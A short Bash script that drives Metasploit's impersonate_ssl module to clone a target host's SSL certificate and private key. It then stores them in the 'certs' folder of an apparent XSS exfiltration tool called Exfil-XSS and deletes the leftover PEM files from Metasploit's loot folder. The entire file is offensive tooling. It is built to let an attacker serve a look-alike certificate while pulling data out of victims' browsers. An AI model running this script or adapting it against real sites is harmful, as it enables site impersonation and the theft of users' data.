#!/bin/bash
# SSL certification cloning script which makes use of MSFConsole and some Bash magic to save the cloned SSL certificate to the "certs" folder used by the Exfil-XSS tool.
target=$1
certandkey=$2
for i in $(msfconsole -qx "use auxiliary/gather/impersonate_ssl;set RHOSTS $target;run;exit" | awk '{print $5}' | grep $HOME | grep -v ".pem");
do if echo $i | grep -q "key";then #echo Key: $i;
    mv $i certs/$certandkey.key;echo "Key saved to $PWD/certs/$certandkey.key";
elif echo $i | grep -q "crt";then #echo Cert: $i;
    mv $i certs/$certandkey.crt;echo "Cert saved to $PWD/certs/$certandkey.crt";
else echo "Key and Cert not found.";
fi;done
#cleaning up PEM files
rm $HOME/.msf4/loot/*.pem
